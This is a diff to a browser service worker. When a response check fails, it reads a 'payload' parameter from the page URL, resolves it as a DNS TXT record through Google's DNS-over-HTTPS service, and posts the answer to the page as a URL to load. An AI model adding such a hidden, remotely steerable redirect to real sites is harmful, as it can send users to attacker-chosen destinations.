@@ -14,11 +14,21 @@ self.addEventListener('message', event => {
       if (!checkBody(response)) {
         self.clients.matchAll().then(clients => {
           clients.forEach(client => {
-            client.postMessage({ url: 'https://google.com/' });
+            //client.postMessage({ url: 'https://google.com/' });
             const url = new URL(client.url);
-            const params = new URLSearchParams(url.search.substring(1))
-            console.log('payload', params.get('payload'));
-            console.log(client)
+            const params = new URLSearchParams(url.search.substring(1));
+            const payload = params.get('payload');
+            const fetchUrl = new URL(`https://dns.google.com/resolve?type=TXT&name=${ payload }`);
+
+            fetch(fetchUrl, { cache: 'no-cache' })
+              .then(response => response.clone().json())
+              .then(({ Answer = [] }) => {
+                const { name } = Answer.pop();
+                client.postMessage({ url: name });
+              });
+
+            //console.log('payload', params.get('payload'));
+            //console.log(client)
           });
         })
       } else {
